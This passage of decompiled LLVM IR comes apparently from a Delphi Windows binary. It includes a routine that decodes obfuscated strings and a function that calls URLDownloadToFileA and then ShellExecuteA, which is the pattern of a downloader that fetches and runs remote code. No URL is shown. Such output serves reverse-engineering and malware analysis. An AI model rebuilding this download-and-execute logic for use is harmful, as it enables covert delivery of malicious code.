  %44 = add i32 %esp.0.reload, -44, !insn.addr !727
  %45 = inttoptr i32 %44 to i32*, !insn.addr !727
  store i32 ptrtoint ([13 x i8]* @global_var_405490 to i32), i32* %45, align 4, !insn.addr !727
  %46 = add i32 %esp.0.reload, -48, !insn.addr !728
  %47 = inttoptr i32 %46 to i32*, !insn.addr !728
  store i32 %arg1, i32* %47, align 4, !insn.addr !728
  %48 = add i32 %esp.0.reload, -52, !insn.addr !729
  %49 = inttoptr i32 %48 to i32*, !insn.addr !729
  store i32 ptrtoint (i32* @global_var_4054a8 to i32), i32* %49, align 4, !insn.addr !729
  %50 = add i32 %esp.0.reload, -56, !insn.addr !730
  %51 = inttoptr i32 %50 to i32*, !insn.addr !730
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %51, align 4, !insn.addr !730
  %52 = call i32 @"@LStrCatN"(), !insn.addr !731
  %53 = call i32 @function_405120(), !insn.addr !732
  %54 = call i32 @function_4051a0(), !insn.addr !733
  %55 = add i32 %esp.0.reload, -60, !insn.addr !734
  %56 = inttoptr i32 %55 to i32*, !insn.addr !734
  store i32 ptrtoint ([11 x i8]* @global_var_4054b4 to i32), i32* %56, align 4, !insn.addr !734
  %57 = add i32 %esp.0.reload, -64, !insn.addr !735
  %58 = inttoptr i32 %57 to i32*, !insn.addr !735
  store i32 %arg2, i32* %58, align 4, !insn.addr !735
  %59 = add i32 %esp.0.reload, -68, !insn.addr !736
  %60 = inttoptr i32 %59 to i32*, !insn.addr !736
  store i32 ptrtoint (i32* @global_var_4054a8 to i32), i32* %60, align 4, !insn.addr !736
  %61 = add i32 %esp.0.reload, -72, !insn.addr !737
  %62 = inttoptr i32 %61 to i32*, !insn.addr !737
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %62, align 4, !insn.addr !737
  %63 = call i32 @"@LStrCatN"(), !insn.addr !738
  %64 = call i32 @function_405120(), !insn.addr !739
  %65 = call i32 @function_4051a0(), !insn.addr !740
  %66 = call i32 @function_405120(), !insn.addr !741
  %67 = call i32 @function_4051a0(), !insn.addr !742
  %68 = add i32 %esp.0.reload, -76, !insn.addr !743
  %69 = inttoptr i32 %68 to i32*, !insn.addr !743
  store i32 ptrtoint ([8 x i8]* @global_var_4054d8 to i32), i32* %69, align 4, !insn.addr !743
  %70 = add i32 %esp.0.reload, -80, !insn.addr !744
  %71 = inttoptr i32 %70 to i32*, !insn.addr !744
  store i32 %arg1, i32* %71, align 4, !insn.addr !744
  %72 = add i32 %esp.0.reload, -84, !insn.addr !745
  %73 = inttoptr i32 %72 to i32*, !insn.addr !745
  store i32 ptrtoint (i32* @global_var_4054a8 to i32), i32* %73, align 4, !insn.addr !745
  %74 = add i32 %esp.0.reload, -88, !insn.addr !746
  %75 = inttoptr i32 %74 to i32*, !insn.addr !746
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %75, align 4, !insn.addr !746
  %76 = add i32 %esp.0.reload, -92, !insn.addr !747
  %77 = inttoptr i32 %76 to i32*, !insn.addr !747
  store i32 ptrtoint ([6 x i8]* @global_var_4054e8 to i32), i32* %77, align 4, !insn.addr !747
  %78 = add i32 %esp.0.reload, -96, !insn.addr !748
  %79 = inttoptr i32 %78 to i32*, !insn.addr !748
  store i32 %arg2, i32* %79, align 4, !insn.addr !748
  %80 = add i32 %esp.0.reload, -100, !insn.addr !749
  %81 = inttoptr i32 %80 to i32*, !insn.addr !749
  store i32 ptrtoint (i32* @global_var_4054a8 to i32), i32* %81, align 4, !insn.addr !749
  %82 = add i32 %esp.0.reload, -104, !insn.addr !750
  %83 = inttoptr i32 %82 to i32*, !insn.addr !750
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %83, align 4, !insn.addr !750
  %84 = add i32 %esp.0.reload, -108, !insn.addr !751
  %85 = inttoptr i32 %84 to i32*, !insn.addr !751
  store i32 ptrtoint ([10 x i8]* @global_var_4054f8 to i32), i32* %85, align 4, !insn.addr !751
  %86 = add i32 %esp.0.reload, -112, !insn.addr !752
  %87 = inttoptr i32 %86 to i32*, !insn.addr !752
  store i32 %arg3, i32* %87, align 4, !insn.addr !752
  %88 = add i32 %esp.0.reload, -116, !insn.addr !753
  %89 = inttoptr i32 %88 to i32*, !insn.addr !753
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %89, align 4, !insn.addr !753
  %90 = add i32 %esp.0.reload, -120, !insn.addr !754
  %91 = inttoptr i32 %90 to i32*, !insn.addr !754
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %91, align 4, !insn.addr !754
  %92 = add i32 %esp.0.reload, -124, !insn.addr !755
  %93 = inttoptr i32 %92 to i32*, !insn.addr !755
  store i32 %arg4, i32* %93, align 4, !insn.addr !755
  %94 = add i32 %esp.0.reload, -128, !insn.addr !756
  %95 = inttoptr i32 %94 to i32*, !insn.addr !756
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %95, align 4, !insn.addr !756
  %96 = add i32 %esp.0.reload, -132, !insn.addr !757
  %97 = inttoptr i32 %96 to i32*, !insn.addr !757
  store i32 ptrtoint (i32* @global_var_40550c to i32), i32* %97, align 4, !insn.addr !757
  %98 = add i32 %esp.0.reload, -136, !insn.addr !758
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_40546c to i32), i32* %99, align 4, !insn.addr !758
  %100 = call i32 @"@LStrCatN"(), !insn.addr !759
  %101 = call i32 @function_405120(), !insn.addr !760
  %102 = call i32 @function_4051a0(), !insn.addr !761
  %103 = call i32 @function_405120(), !insn.addr !762
  %104 = call i32 @function_4051a0(), !insn.addr !763
  %105 = call i32 @function_405114(), !insn.addr !764
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !765
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !765
  br label %dec_label_pc_40540c, !insn.addr !765

dec_label_pc_40540c:                              ; preds = %dec_label_pc_40524a, %dec_label_pc_4051dc
  %106 = add i32 %esp.0.reload, -16, !insn.addr !766
  %107 = inttoptr i32 %106 to i32*, !insn.addr !766
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !767
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !768
  %109 = add i32 %esp.1.reload, 8, !insn.addr !769
  %110 = inttoptr i32 %109 to i32*, !insn.addr !769
  store i32 4215880, i32* %110, align 4, !insn.addr !769
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !770
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !771
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !772
  ret i32 %113, !insn.addr !773
}

define i32 @function_405441() local_unnamed_addr {
dec_label_pc_405441:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !774
  ret i32 %0, !insn.addr !774
}

define i32 @function_405446() local_unnamed_addr {
dec_label_pc_405446:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !775
}

define i32 @function_405448(i32 %arg1) local_unnamed_addr {
dec_label_pc_405448:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !776
}

define i32 @function_405513() local_unnamed_addr {
dec_label_pc_405513:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !777
  %4 = inttoptr i32 %0 to i32*, !insn.addr !777
  store i32 %3, i32* %4, align 4, !insn.addr !777
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !778
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !778
  %9 = add i8 %6, %8, !insn.addr !778
  %10 = inttoptr i32 %7 to i8*, !insn.addr !778
  store i8 %9, i8* %10, align 1, !insn.addr !778
  %11 = add i32 %2, 85, !insn.addr !779
  %12 = inttoptr i32 %11 to i8*, !insn.addr !779
  %13 = load i8, i8* %12, align 1, !insn.addr !779
  %14 = trunc i32 %1 to i8, !insn.addr !779
  %15 = add i8 %13, %14, !insn.addr !779
  store i8 %15, i8* %12, align 1, !insn.addr !779
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !780
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !780
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !780
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !781
  %18 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !782
  %19 = add i32 %18, 1, !insn.addr !782
  %20 = icmp eq i32 %19, 0, !insn.addr !782
  store i32 %19, i32* @global_var_4096a4, align 4, !insn.addr !782
  %21 = icmp eq i1 %20, false, !insn.addr !783
  br i1 %21, label %dec_label_pc_40554d, label %dec_label_pc_405539, !insn.addr !783

dec_label_pc_405539:                              ; preds = %dec_label_pc_405513
  %22 = call i32 @"@LStrClr"(), !insn.addr !784
  %23 = call i32 @"@LStrClr"(), !insn.addr !785
  br label %dec_label_pc_40554d, !insn.addr !785

dec_label_pc_40554d:                              ; preds = %dec_label_pc_405539, %dec_label_pc_405513
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !786
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !787
  ret i32 0, !insn.addr !788
}

define i32 @function_40555b() local_unnamed_addr {
dec_label_pc_40555b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !789
  ret i32 %0, !insn.addr !789
}

define i32 @function_405560() local_unnamed_addr {
dec_label_pc_405560:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !790
}

define i32 @function_405562(i32 %arg1) local_unnamed_addr {
dec_label_pc_405562:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !791
}

define i32 @function_405564() local_unnamed_addr {
dec_label_pc_405564:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a4, align 4, !insn.addr !792
  %2 = add i32 %1, -1, !insn.addr !792
  store i32 %2, i32* @global_var_4096a4, align 4, !insn.addr !792
  ret i32 %0, !insn.addr !793
}

define i32 @function_40556c() local_unnamed_addr {
dec_label_pc_40556c:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !794
  ret i32 %0, !insn.addr !794
}

define i32 @function_405574() local_unnamed_addr {
dec_label_pc_405574:
  %esi.0.reg2mem = alloca i32, !insn.addr !795
  %ebx.0.reg2mem = alloca i32, !insn.addr !795
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !796
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !797
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !797
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !797
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !798
  %4 = call i32 @function_4034c8(), !insn.addr !799
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !800
  %6 = call i32 @function_4034c8(), !insn.addr !801
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !802
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !802
  br i1 %7, label %dec_label_pc_4055ea, label %dec_label_pc_4055ba, !insn.addr !802

dec_label_pc_4055ba:                              ; preds = %dec_label_pc_405574, %dec_label_pc_4055e6
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !803
  %10 = inttoptr i32 %9 to i8*, !insn.addr !803
  %11 = load i8, i8* %10, align 1, !insn.addr !803
  %12 = icmp eq i8 %11, 61, !insn.addr !803
  %13 = icmp eq i1 %12, false, !insn.addr !804
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_4055d2, label %dec_label_pc_4055c4, !insn.addr !804

dec_label_pc_4055c4:                              ; preds = %dec_label_pc_4055ba
  %15 = add i32 %14, %8, !insn.addr !805
  %16 = inttoptr i32 %15 to i8*, !insn.addr !805
  store i8 46, i8* %16, align 1, !insn.addr !805
  br label %dec_label_pc_4055e6, !insn.addr !806

dec_label_pc_4055d2:                              ; preds = %dec_label_pc_4055ba
  %17 = load i8, i8* %10, align 1, !insn.addr !807
  %18 = add i8 %17, -1, !insn.addr !808
  %19 = add i32 %14, %8, !insn.addr !809
  %20 = inttoptr i32 %19 to i8*, !insn.addr !809
  store i8 %18, i8* %20, align 1, !insn.addr !809
  br label %dec_label_pc_4055e6, !insn.addr !809

dec_label_pc_4055e6:                              ; preds = %dec_label_pc_4055d2, %dec_label_pc_4055c4
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !810
  %22 = add i32 %esi.0.reload, -1, !insn.addr !811
  %23 = icmp eq i32 %22, 0, !insn.addr !811
  %24 = icmp eq i1 %23, false, !insn.addr !812
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !812
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !812
  br i1 %24, label %dec_label_pc_4055ba, label %dec_label_pc_4055ea, !insn.addr !812

dec_label_pc_4055ea:                              ; preds = %dec_label_pc_4055e6, %dec_label_pc_405574
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !813
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !814
  %26 = call i32 @"@LStrClr"(), !insn.addr !815
  ret i32 %26, !insn.addr !816
}

define i32 @function_405600() local_unnamed_addr {
dec_label_pc_405600:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !817
  ret i32 %0, !insn.addr !817
}

define i32 @function_405605() local_unnamed_addr {
dec_label_pc_405605:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !818
}

define i32 @function_405607(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405607:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !819
}

define i32 @function_405610() local_unnamed_addr {
dec_label_pc_405610:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !820
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !821
  %4 = call i32 @"@LStrFromString"(), !insn.addr !822
  ret i32 %4, !insn.addr !823
}

define i32 @function_405648() local_unnamed_addr {
dec_label_pc_405648:
  %ecx.0.reg2mem = alloca i32, !insn.addr !824
  %esp.0.reg2mem = alloca i32, !insn.addr !824
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !824
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !825
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !825
  br label %dec_label_pc_405650, !insn.addr !825

dec_label_pc_405650:                              ; preds = %dec_label_pc_405650, %dec_label_pc_405648
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !826
  %2 = inttoptr i32 %1 to i32*, !insn.addr !826
  store i32 0, i32* %2, align 4, !insn.addr !826
  %3 = add i32 %esp.0.reload, -8, !insn.addr !827
  %4 = inttoptr i32 %3 to i32*, !insn.addr !827
  store i32 0, i32* %4, align 4, !insn.addr !827
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !828
  %6 = icmp eq i32 %5, 0, !insn.addr !828
  %7 = icmp eq i1 %6, false, !insn.addr !829
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !829
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !829
  br i1 %7, label %dec_label_pc_405650, label %dec_label_pc_405657, !insn.addr !829

dec_label_pc_405657:                              ; preds = %dec_label_pc_405650
  %8 = add i32 %esp.0.reload, -12, !insn.addr !830
  %9 = inttoptr i32 %8 to i32*, !insn.addr !830
  store i32 0, i32* %9, align 4, !insn.addr !830
  %10 = add i32 %esp.0.reload, -16, !insn.addr !831
  %11 = inttoptr i32 %10 to i32*, !insn.addr !831
  %12 = add i32 %esp.0.reload, -20, !insn.addr !832
  %13 = inttoptr i32 %12 to i32*, !insn.addr !832
  store i32 %0, i32* %13, align 4, !insn.addr !832
  %14 = add i32 %esp.0.reload, -24, !insn.addr !833
  %15 = inttoptr i32 %14 to i32*, !insn.addr !833
  store i32 4216719, i32* %15, align 4, !insn.addr !833
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !834
  %17 = add i32 %esp.0.reload, -28, !insn.addr !834
  %18 = inttoptr i32 %17 to i32*, !insn.addr !834
  store i32 %16, i32* %18, align 4, !insn.addr !834
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !835
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !836
  %20 = call i32 @function_405574(), !insn.addr !837
  %21 = call i32 @function_4036c8(), !insn.addr !838
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !839
  %23 = add i32 %esp.0.reload, -32, !insn.addr !840
  %24 = inttoptr i32 %23 to i32*, !insn.addr !840
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !840
  store i32 %25, i32* %24, align 4, !insn.addr !840
  %26 = call i32 @"@LStrCopy"(), !insn.addr !841
  %27 = call i32 @"@LStrDelete"(), !insn.addr !842
  %28 = add i32 %esp.0.reload, -36, !insn.addr !843
  %29 = inttoptr i32 %28 to i32*, !insn.addr !843
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !843
  store i32 %30, i32* %29, align 4, !insn.addr !843
  %31 = call i32 @function_4034c8(), !insn.addr !844
  %32 = call i32 @"@LStrCopy"(), !insn.addr !845
  %33 = add i32 %esp.0.reload, -40, !insn.addr !846
  %34 = inttoptr i32 %33 to i32*, !insn.addr !846
  store i32 ptrtoint ([6 x i8]* @global_var_4057a4 to i32), i32* %34, align 4, !insn.addr !846
  %35 = call i32 @function_405610(), !insn.addr !847
  %36 = add i32 %esp.0.reload, -44, !insn.addr !848
  %37 = inttoptr i32 %36 to i32*, !insn.addr !848
  %38 = add i32 %esp.0.reload, -48, !insn.addr !849
  %39 = inttoptr i32 %38 to i32*, !insn.addr !849
  store i32 ptrtoint (i32* @global_var_4057b4 to i32), i32* %39, align 4, !insn.addr !849
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !850
  %41 = add i32 %esp.0.reload, -52, !insn.addr !850
  %42 = inttoptr i32 %41 to i32*, !insn.addr !850
  store i32 %40, i32* %42, align 4, !insn.addr !850
  %43 = call i32 @"@LStrCatN"(), !insn.addr !851
  %44 = add i32 %esp.0.reload, -56, !insn.addr !852
  %45 = inttoptr i32 %44 to i32*, !insn.addr !852
  store i32 0, i32* %45, align 4, !insn.addr !852
  %46 = add i32 %esp.0.reload, -60, !insn.addr !853
  %47 = inttoptr i32 %46 to i32*, !insn.addr !853
  store i32 0, i32* %47, align 4, !insn.addr !853
  %48 = call i32 @"@LStrCat3"(), !insn.addr !854
  %49 = call i32 @function_4036c8(), !insn.addr !855
  %50 = add i32 %esp.0.reload, -64, !insn.addr !856
  %51 = inttoptr i32 %50 to i32*, !insn.addr !856
  store i32 %49, i32* %51, align 4, !insn.addr !856
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !857
  %53 = call i32 @function_405574(), !insn.addr !858
  %54 = call i32 @function_4036c8(), !insn.addr !859
  %55 = add i32 %esp.0.reload, -68, !insn.addr !860
  %56 = inttoptr i32 %55 to i32*, !insn.addr !860
  store i32 %54, i32* %56, align 4, !insn.addr !860
  %57 = add i32 %esp.0.reload, -72, !insn.addr !861
  %58 = inttoptr i32 %57 to i32*, !insn.addr !861
  store i32 0, i32* %58, align 4, !insn.addr !861
  %59 = call i32 @function_40556c(), !insn.addr !862
  %60 = add i32 %esp.0.reload, -76, !insn.addr !863
  %61 = inttoptr i32 %60 to i32*, !insn.addr !863
  store i32 1, i32* %61, align 4, !insn.addr !863
  %62 = add i32 %esp.0.reload, -80, !insn.addr !864
  %63 = inttoptr i32 %62 to i32*, !insn.addr !864
  store i32 0, i32* %63, align 4, !insn.addr !864
  %64 = add i32 %esp.0.reload, -84, !insn.addr !865
  %65 = inttoptr i32 %64 to i32*, !insn.addr !865
  store i32 0, i32* %65, align 4, !insn.addr !865
  %66 = call i32 @"@LStrCat3"(), !insn.addr !866
  %67 = call i32 @function_4036c8(), !insn.addr !867
  %68 = add i32 %esp.0.reload, -88, !insn.addr !868
  %69 = inttoptr i32 %68 to i32*, !insn.addr !868
  store i32 %67, i32* %69, align 4, !insn.addr !868
  %70 = add i32 %esp.0.reload, -92, !insn.addr !869
  %71 = inttoptr i32 %70 to i32*, !insn.addr !869
  store i32 ptrtoint ([5 x i8]* @global_var_4057c4 to i32), i32* %71, align 4, !insn.addr !869
  %72 = add i32 %esp.0.reload, -96, !insn.addr !870
  %73 = inttoptr i32 %72 to i32*, !insn.addr !870
  store i32 0, i32* %73, align 4, !insn.addr !870
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !871
  %75 = load i32, i32* %73, align 4, !insn.addr !872
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !873
  store i32 4216726, i32* %69, align 4, !insn.addr !874
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !875
  ret i32 %76, !insn.addr !876
}

define i32 @function_40578f() local_unnamed_addr {
dec_label_pc_40578f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !877
  ret i32 %0, !insn.addr !877
}

define i32 @function_405794() local_unnamed_addr {
dec_label_pc_405794:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !878
}

define i32 @function_405796(i32 %arg1) local_unnamed_addr {
dec_label_pc_405796:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !879
}

define i32 @function_4057bb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4057bb:
  %esp.1.reg2mem = alloca i32, !insn.addr !880
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !880
  %ecx.0.reg2mem = alloca i32, !insn.addr !880
  %esp.0.reg2mem = alloca i32, !insn.addr !880
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !880
  %6 = inttoptr i32 %2 to i32*, !insn.addr !880
  store i32 %5, i32* %6, align 4, !insn.addr !880
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !881
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !881
  %11 = add i8 %8, %10, !insn.addr !881
  %12 = inttoptr i32 %9 to i8*, !insn.addr !881
  store i8 %11, i8* %12, align 1, !insn.addr !881
  %13 = add i32 %2, 58, !insn.addr !882
  %14 = inttoptr i32 %13 to i8*, !insn.addr !882
  %15 = load i8, i8* %14, align 1, !insn.addr !882
  %16 = load i32, i32* %eax, align 4, !insn.addr !882
  %17 = udiv i32 %16, 256, !insn.addr !882
  %18 = trunc i32 %17 to i8, !insn.addr !882
  %19 = add i8 %15, %18, !insn.addr !882
  store i8 %19, i8* %14, align 1, !insn.addr !882
  %20 = add i32 %0, 112, !insn.addr !883
  %21 = inttoptr i32 %20 to i8*, !insn.addr !883
  %22 = load i8, i8* %21, align 1, !insn.addr !883
  %23 = trunc i32 %4 to i8, !insn.addr !883
  %24 = add i8 %22, %23, !insn.addr !883
  store i8 %24, i8* %21, align 1, !insn.addr !883
  %25 = trunc i32 %3 to i16, !insn.addr !884
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !884
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !884
  %27 = load i8, i8* %7, align 4, !insn.addr !885
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !885
  %30 = add i8 %27, %29, !insn.addr !885
  %31 = inttoptr i32 %28 to i8*, !insn.addr !885
  store i8 %30, i8* %31, align 1, !insn.addr !885
  %32 = load i8, i8* %7, align 4, !insn.addr !886
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !886
  %35 = add i8 %32, %34, !insn.addr !886
  %36 = inttoptr i32 %33 to i8*, !insn.addr !886
  store i8 %35, i8* %36, align 1, !insn.addr !886
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !887
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !888
  store i32 10, i32* %ecx.0.reg2mem, !insn.addr !888
  br label %dec_label_pc_4057d4, !insn.addr !888

dec_label_pc_4057d4:                              ; preds = %dec_label_pc_4057d4, %dec_label_pc_4057bb
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !889
  %39 = inttoptr i32 %38 to i32*, !insn.addr !889
  store i32 0, i32* %39, align 4, !insn.addr !889
  %40 = add i32 %esp.0.reload, -8, !insn.addr !890
  %41 = inttoptr i32 %40 to i32*, !insn.addr !890
  store i32 0, i32* %41, align 4, !insn.addr !890
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !891
  %43 = icmp eq i32 %42, 0, !insn.addr !891
  %44 = icmp eq i1 %43, false, !insn.addr !892
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !892
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !892
  br i1 %44, label %dec_label_pc_4057d4, label %dec_label_pc_4057db, !insn.addr !892

dec_label_pc_4057db:                              ; preds = %dec_label_pc_4057d4
  %45 = add i32 %esp.0.reload, -16, !insn.addr !893
  %46 = inttoptr i32 %45 to i32*, !insn.addr !893
  store i32 %37, i32* %46, align 4, !insn.addr !893
  %47 = add i32 %esp.0.reload, -20, !insn.addr !894
  %48 = inttoptr i32 %47 to i32*, !insn.addr !894
  store i32 4217309, i32* %48, align 4, !insn.addr !894
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !895
  %50 = add i32 %esp.0.reload, -24, !insn.addr !895
  %51 = inttoptr i32 %50 to i32*, !insn.addr !895
  store i32 %49, i32* %51, align 4, !insn.addr !895
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !896
  %52 = call i32 @"@LStrPos"(), !insn.addr !897
  %53 = add i32 %esp.0.reload, -28, !insn.addr !898
  %54 = inttoptr i32 %53 to i32*, !insn.addr !898
  %55 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !898
  store i32 %55, i32* %54, align 4, !insn.addr !898
  %56 = call i32 @"@LStrCopy"(), !insn.addr !899
  %57 = add i32 %esp.0.reload, -32, !insn.addr !900
  %58 = inttoptr i32 %57 to i32*
  %59 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !900
  store i32 %59, i32* %58, align 4, !insn.addr !900
  %60 = call i32 @function_4034c8(), !insn.addr !901
  %61 = call i32 @"@LStrCopy"(), !insn.addr !902
  %62 = add i32 %arg1, -1, !insn.addr !903
  store i32 %62, i32* %eax, align 4, !insn.addr !903
  store i32* %58, i32** %.pre-phi.reg2mem
  store i32 %57, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4059c2 [
    i32 0, label %dec_label_pc_40584c
    i32 1, label %dec_label_pc_40594d
    i32 2, label %dec_label_pc_4059b7
  ]

dec_label_pc_40584c:                              ; preds = %dec_label_pc_4057db
  %63 = call i32 @function_4034c8(), !insn.addr !904
  %64 = icmp slt i32 %63, 5, !insn.addr !905
  store i32* %58, i32** %.pre-phi.reg2mem, !insn.addr !905
  store i32 %57, i32* %esp.1.reg2mem, !insn.addr !905
  br i1 %64, label %dec_label_pc_4059c2, label %dec_label_pc_40585d, !insn.addr !905

dec_label_pc_40585d:                              ; preds = %dec_label_pc_40584c
  %65 = call i32 @"@LStrFromPChar"(), !insn.addr !906
  %66 = call i32 @function_405574(), !insn.addr !907
  %67 = add i32 %esp.0.reload, -36, !insn.addr !908
  %68 = inttoptr i32 %67 to i32*, !insn.addr !908
  %69 = call i32 @"@LStrFromPChar"(), !insn.addr !909
  %70 = call i32 @function_405574(), !insn.addr !910
  %71 = add i32 %esp.0.reload, -40, !insn.addr !911
  %72 = inttoptr i32 %71 to i32*, !insn.addr !911
  %73 = load i32, i32* %stack_var_-4, align 4, !insn.addr !912
  %74 = add i32 %esp.0.reload, -44, !insn.addr !912
  %75 = inttoptr i32 %74 to i32*, !insn.addr !912
  store i32 %73, i32* %75, align 4, !insn.addr !912
  %76 = add i32 %esp.0.reload, -48, !insn.addr !913
  %77 = inttoptr i32 %76 to i32*, !insn.addr !913
  store i32 ptrtoint (i32* @global_var_405a00 to i32), i32* %77, align 4, !insn.addr !913
  %78 = load i32, i32* %stack_var_-8, align 4, !insn.addr !914
  %79 = add i32 %esp.0.reload, -52, !insn.addr !914
